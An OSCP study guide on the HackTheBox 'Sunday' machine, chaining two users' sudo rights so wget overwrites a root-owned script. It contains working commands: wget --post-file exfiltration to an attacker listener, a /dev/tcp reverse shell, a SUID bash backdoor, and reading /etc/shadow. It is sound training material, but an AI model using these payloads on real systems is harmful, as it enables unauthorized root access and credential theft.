# The `/root/troll` + `wget` Privilege Escalation Chain — Complete OSCP Guide

> **Scope:** What `/root/troll` actually is, why it's not a generic Linux command, how the sudo `wget` file-overwrite trick works, and the full chain from low-priv shell to root. This technique is best known from the HackTheBox "Sunday" machine — a retired, publicly documented box widely used for OSCP practice.

---

## Table of Contents

1. [What is `/root/troll`](#1-what-is-rootroll)
   - 1.1 It Is Not a Built-in Command
   - 1.2 What It Actually Is on the Sunday Box
   - 1.3 Why It's a Privesc Vector

2. [The Core Vulnerability — sudo wget](#2-the-core-vulnerability--sudo-wget)
   - 2.1 Why wget With sudo Rights Is Dangerous
   - 2.2 wget's Relevant Flags for This Attack
   - 2.3 Checking for This Misconfiguration

3. [Step 1 — Enumerate sudo Rights](#3-step-1--enumerate-sudo-rights)

4. [Step 2 — Read the Original File First](#4-step-2--read-the-original-file-first)
   - 4.1 Using wget --post-file to Exfiltrate Content
   - 4.2 Why You Read Before You Overwrite

5. [Step 3 — Craft Your Malicious Payload](#5-step-3--craft-your-malicious-payload)

6. [Step 4 — Overwrite the Root-Owned File](#6-step-4--overwrite-the-root-owned-file)

7. [Step 5 — Trigger Execution as Root](#7-step-5--trigger-execution-as-root)

8. [Variations of This Attack](#8-variations-of-this-attack)
   - 8.1 wget -O Direct Overwrite
   - 8.2 wget -i Arbitrary File Read
   - 8.3 Other Download Tools With the Same Flaw (curl, ftp, tftp)

9. [Why This Pattern Matters Beyond This One Box](#9-why-this-pattern-matters-beyond-this-one-box)

10. [Full Attack Walkthrough](#10-full-attack-walkthrough)

11. [Quick Reference Card](#11-quick-reference-card)

---

## 1. What is `/root/troll`

### 1.1 It Is Not a Built-in Command

`/root/troll` is **not** a Linux system command, built-in utility, or standard tool. It will not appear in `man troll`, it's not in `/usr/bin`, and there's no package called "troll." If you search for a generic "troll command," you won't find anything in Linux documentation — that's expected, because it doesn't exist as a general concept.

### 1.2 What It Actually Is on the Sunday Box

On the well-known HackTheBox machine "Sunday," `/root/troll` is simply a **custom script file placed by the box author**, owned by `root`, sitting in `/root/`. It is a small bash script:

```bash
#!/usr/bin/bash
/usr/bin/echo "testing"
/usr/bin/id
```

The name "troll" is just the author's chosen filename — it's a joke/red-herring name, not a meaningful technical term. What makes it interesting isn't the file's name or its harmless content — it's that:

1. A low-privileged user (`sunny`) has a **sudoers entry** allowing them to execute it as root:
   ```
   (root) NOPASSWD: /root/troll
   ```
2. A **different** low-privileged user (`sammy`) has a sudoers entry allowing them to run `wget` as root:
   ```
   (root) NOPASSWD: /usr/bin/wget
   ```

Neither privilege alone is dangerous. **Combined, they are root.**

### 1.3 Why It's a Privesc Vector

The vulnerability isn't in the `troll` script itself — it's in the **combination of two separate sudo misconfigurations held by two different users**:

```
User A (sammy) can run wget as root
        +
User B (sunny) can run /root/troll as root
        =
sammy uses wget to OVERWRITE /root/troll with a malicious script
sunny then runs sudo /root/troll → executes sammy's malicious code as root
```

This is a classic example of **privilege escalation through file overwrite via an overly-permissive sudo binary**, chained across two accounts.

---

## 2. The Core Vulnerability — sudo wget

### 2.1 Why wget With sudo Rights Is Dangerous

`wget` is a legitimate, common Linux download utility. The problem is never the program itself — it's that `wget` is an extremely flexible tool, and if a sysadmin grants `sudo` rights to run it without restricting arguments, the user effectively gets to:

- **Write arbitrary content to any file on the filesystem as root** (via `-O`)
- **Read arbitrary files on the system and exfiltrate them** (via `-i` or `--post-file`)

This is precisely why `wget` (along with many other binaries) appears on **GTFOBins** — a curated list of Unix binaries that can be abused to bypass security restrictions when given elevated/sudo rights.

### 2.2 wget's Relevant Flags for This Attack

| Flag | Purpose | Attack Use |
|---|---|---|
| `-O <file>` | Write output to a specific file | **Overwrite any root-owned file** |
| `-i <file>` | Read a list of URLs to fetch from a local file | **Arbitrary local file read** (it'll try to parse the file's contents as URLs, leaking content in error messages) |
| `--post-file=<file>` | Upload the contents of a local file via HTTP POST | **Exfiltrate a file's content** to your listener |
| `-q` | Quiet mode | Suppress output during automation |

### 2.3 Checking for This Misconfiguration

```bash
# The very first command to run on ANY low-priv shell
sudo -l

# Look specifically for:
# (root) NOPASSWD: /usr/bin/wget
# (root) NOPASSWD: /root/troll      (or any other root-owned script)
```

If you see `wget` (or `curl`, `ftp`, `tftp`, `scp`, etc.) in your sudo rights, immediately think: **"What root-owned file can I read or overwrite with this?"**

---

## 3. Step 1 — Enumerate sudo Rights

```bash
# Check what you can run as root
sudo -l

# Example output (as user sammy):
# User sammy may run the following commands on sunday:
#     (root) NOPASSWD: /usr/bin/wget

# Check what OTHER users might have (if you can read /etc/sudoers — usually you can't directly,
# but you might discover other accounts' rights after gaining access to them)
cat /etc/sudoers 2>/dev/null
ls -la /etc/sudoers.d/ 2>/dev/null

# Look for any root-owned scripts that low-priv users might be allowed to run
find / -maxdepth 2 -user root -perm -100 -type f 2>/dev/null
```

**Key insight:** if you've compromised multiple user accounts on the same box (e.g., via Finger username enumeration + password cracking, as covered in the Finger/Port-79 guide), check `sudo -l` under **each** account separately. The privesc path often requires combining rights from two different users.

---

## 4. Step 2 — Read the Original File First

### 4.1 Using wget --post-file to Exfiltrate Content

Before overwriting anything, it's good practice to read the target file first — both to understand what you're dealing with, and because OSCP exam grading sometimes wants you to demonstrate you understood the original state.

```bash
# Step 1 — Start a netcat listener on attacker machine
nc -lvnp <LPORT>

# Step 2 — On target, use sudo wget to POST the file's content to your listener
sudo wget --post-file=/root/troll <YOUR_TUN0_IP>:<LPORT>

# Your listener receives an HTTP POST request — the body contains the file's raw content
# Example output in the listener:
# POST / HTTP/1.1
# ...
# #!/usr/bin/bash
# /usr/bin/echo "testing"
# /usr/bin/id
```

### 4.2 Why You Read Before You Overwrite

This step confirms:
- The file is a script that gets executed (not just data)
- What interpreter it uses (`#!/usr/bin/bash` here)
- That overwriting it with your own bash script will work the same way when triggered

---

## 5. Step 3 — Craft Your Malicious Payload

```bash
# Simplest payload — spawn a shell when executed
cat > troll <<'EOF'
#!/usr/bin/bash
/bin/bash
EOF

# Reverse shell payload (better — gives you a shell on YOUR listener, not the target's TTY)
cat > troll <<'EOF'
#!/usr/bin/bash
bash -i >& /dev/tcp/<YOUR_TUN0_IP>/<LPORT> 0>&1
EOF

# Add SUID bit to bash for a persistent backdoor (alternative payload)
cat > troll <<'EOF'
#!/usr/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
EOF
```

---

## 6. Step 4 — Overwrite the Root-Owned File

### Method 1 — Direct overwrite using wget -O

```bash
# Step 1 — Host your malicious script on attacker machine
python3 -m http.server 80
# (place troll script in your working directory first)

# Step 2 — On target, use sudo wget to download and OVERWRITE the root file directly
sudo wget <YOUR_TUN0_IP>/troll -O /root/troll

# This works because:
# - wget runs as root (via sudo)
# - -O specifies the exact output path, including root-owned locations
# - wget will happily overwrite an existing file at that path
```

### Method 2 — Two-step (download locally, then move)

```bash
# If -O directly to /root fails for any reason, download locally first
sudo wget <YOUR_TUN0_IP>/troll -O /tmp/troll

# Then use sudo wget creatively, or another sudo-permitted tool, to move it into place
# (only works if you have an additional sudo right that allows file operations)
```

---

## 7. Step 5 — Trigger Execution as Root

This is where the **second user's sudo right** comes in.

```bash
# Switch to (or open a separate SSH session as) the OTHER compromised user
# who has rights to execute /root/troll

ssh sunny@<TARGET_IP>
# password: <found via Finger + hashcat/hydra, see Finger guide>

# Start your listener BEFORE triggering (if using reverse shell payload)
nc -lvnp <LPORT>

# Execute the now-overwritten file with its sudo rights
sudo /root/troll

# If you used the bash spawn payload:
# uid=0(root) gid=0(root) groups=0(root)
# You now have a root shell directly in this session!

# If you used the reverse shell payload:
# Check your listener — it receives a connection as root
```

---

## 8. Variations of This Attack

### 8.1 wget -O Direct Overwrite (covered above — the main technique)

### 8.2 wget -i Arbitrary File Read

If you only have read access needs (not overwrite), `wget -i` can leak file contents through error messages, since it tries to interpret each line of the given file as a URL:

```bash
# Read /etc/shadow indirectly (works because wget reports invalid URLs verbatim in errors)
sudo wget -i /etc/shadow
# Errors will often echo back the literal content of each "invalid URL" line
```

### 8.3 Other Download Tools With the Same Flaw

The exact same logic applies to **any** file-transfer or download utility granted unrestricted sudo rights:

```bash
# curl
sudo curl -o /root/troll http://<YOUR_TUN0_IP>/troll

# ftp (less common but same idea)
sudo ftp -o /root/troll <YOUR_TUN0_IP>

# tftp
sudo tftp <YOUR_TUN0_IP> -c get troll /root/troll

# scp (if sudo rights granted)
sudo scp user@<YOUR_TUN0_IP>:/path/troll /root/troll

# Always check GTFOBins for the exact binary you find in `sudo -l`
# https://gtfobins.github.io/
```

---

## 9. Why This Pattern Matters Beyond This One Box

The `/root/troll` filename is specific to one CTF machine, but the **underlying pattern is extremely common in real-world misconfigurations and across many OSCP-style machines**:

```
General pattern:
  1. sudo -l reveals a binary that can write/overwrite files (wget, curl, cp, tar, vim, etc.)
  2. There exists SOME root-owned file/script that gets executed
     either by cron, by another sudo right, by a service restart, or by another user
  3. Overwrite that file's content using your write-capable sudo binary
  4. Trigger its execution (wait for cron, ask/become the other user, restart the service)
  5. Your payload runs with root privileges
```

**Always check GTFOBins first** whenever `sudo -l` shows you any binary you don't immediately recognize as dangerous — many "harmless-looking" tools (find, vim, less, awk, python, perl, tar, zip) have a documented sudo bypass.

```bash
# Quick local GTFOBins-style check
# https://gtfobins.github.io/#+sudo
# Search for the exact binary name shown in your `sudo -l` output
```

---

## 10. Full Attack Walkthrough

**Scenario:** You've compromised two separate low-priv accounts on the same Solaris/Linux box (e.g., via Finger username enumeration + cracked password hashes, see the Finger and Port-79 guides).

**Step 1 — Check sudo rights on first account (sammy):**
```bash
ssh sammy@<TARGET_IP>
sudo -l
# (root) NOPASSWD: /usr/bin/wget
```

**Step 2 — Check sudo rights on second account (sunny):**
```bash
ssh sunny@<TARGET_IP>
sudo -l
# (root) NOPASSWD: /root/troll
```

**Step 3 — Read the original /root/troll content (as sammy):**
```bash
# Attacker
nc -lvnp <LPORT>

# Target (sammy)
sudo wget --post-file=/root/troll <YOUR_TUN0_IP>:<LPORT>

# Listener shows:
# #!/usr/bin/bash
# /usr/bin/echo "testing"
# /usr/bin/id
```

**Step 4 — Craft malicious replacement:**
```bash
# Attacker
cat > troll <<'EOF'
#!/usr/bin/bash
/bin/bash
EOF
python3 -m http.server 80
```

**Step 5 — Overwrite /root/troll (as sammy):**
```bash
# Target (sammy)
sudo wget <YOUR_TUN0_IP>/troll -O /root/troll
```

**Step 6 — Trigger execution (as sunny):**
```bash
# Target (sunny, separate session)
sudo /root/troll
# id
# uid=0(root) gid=0(root) ✅
```

**Step 7 — Grab the flag:**
```bash
cat /root/root.txt
```

---

## 11. Quick Reference Card

```
====================================================================
 /root/troll + sudo wget PRIVESC CHAIN — OSCP QUICK REFERENCE
====================================================================

[WHAT IT IS]
  /root/troll is NOT a Linux command — it's a custom root-owned
  script file used as a privesc target on one specific CTF box.
  The real lesson: sudo rights on file-writing tools = root.

[STEP 1 — ALWAYS CHECK FIRST, ON EVERY USER YOU COMPROMISE]
  sudo -l
  → Look for: wget, curl, cp, tar, vim, find, any unrestricted binary
  → Check GTFOBins for that exact binary: https://gtfobins.github.io/

[STEP 2 — READ THE TARGET FILE FIRST (recon)]
  Attacker: nc -lvnp <LPORT>
  Target:   sudo wget --post-file=/root/troll <YOUR_TUN0_IP>:<LPORT>

[STEP 3 — CRAFT MALICIOUS REPLACEMENT]
  cat > troll <<'EOF'
  #!/usr/bin/bash
  bash -i >& /dev/tcp/<YOUR_TUN0_IP>/<LPORT> 0>&1
  EOF

[STEP 4 — OVERWRITE WITH wget -O]
  Attacker: python3 -m http.server 80
  Target:   sudo wget <YOUR_TUN0_IP>/troll -O /root/troll

[STEP 5 — TRIGGER AS THE OTHER PRIVILEGED USER]
  sudo /root/troll
  → id  →  uid=0(root) ✅

[OTHER FLAGS/TOOLS THAT DO THE SAME THING]
  wget -i /etc/shadow        → arbitrary file READ via error messages
  sudo curl -o /root/x http://attacker/x
  sudo tftp attacker -c get x /root/x
  sudo cp /tmp/x /root/x      (if cp is the sudo right instead)

[GENERAL PATTERN — applies to MANY OSCP boxes, not just this one]
  1. sudo -l shows a file-write-capable binary
  2. Some root-owned file gets executed somewhere (sudo right, cron, service)
  3. Overwrite it via your sudo binary
  4. Trigger execution → root

[KEY TAKEAWAY]
  Never assume an unfamiliar filename in sudo -l output is a real
  system command. Check GTFOBins, check what it does, and think:
  "what root-owned file can I read or write with this?"
====================================================================
```

---

*This document is for authorized penetration testing, OSCP exam preparation, and CTF competitions only. Always obtain written permission before testing systems you do not own.*
